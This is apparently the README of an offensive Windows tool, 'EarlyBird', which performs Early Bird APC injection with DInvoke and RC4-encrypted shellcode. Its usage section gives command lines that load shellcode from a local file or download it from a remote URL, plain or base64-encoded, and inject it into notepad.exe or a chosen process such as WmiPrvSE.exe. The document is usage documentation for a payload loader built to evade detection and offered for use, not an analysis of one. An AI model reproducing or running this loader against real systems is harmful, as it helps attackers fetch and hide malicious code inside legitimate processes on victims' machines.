EarlyBird APC Injection
===
Implementation of Early Bird APC Injection using DInvoke, with RC4 encryption, and the capability to receive the encrypted shellcode locally or remotely.

Usage
---
```
Usage [1]: Passing the shellcode locally and using the default process: C:\Windows\System32\notepad.exe
        e.g. EarlyBird.exe -shellcode <shellcode-file>
        e.g. EarlyBird.exe -shellcode C:\Users\user\Desktop\shellcode.sc

Usage [2]: Passing the shellcode remotely and using the default process: C:\Windows\System32\notepad.exe
        e.g. EarlyBird.exe -shellcode <url>
        e.g. EarlyBird.exe -shellcode https://example.com/shellcode.sc

Usage [3]: Passing the base64 encoded shellcode remotely and using the default process: C:\Windows\System32\notepad.exe
        e.g. EarlyBird.exe -shellcode base64:<url>
        e.g. EarlyBird.exe -shellcode base64:https://example.com/shellcode.txt

[i] You can change the target process by passing the -process flag to any of the three ways to run EarlyBird.exe
        e.g. EarlyBird.exe -shellcode base64:https://example.com/shellcode.txt -process C:\Windows\System32\Wbem\WmiPrvSE.exe
```
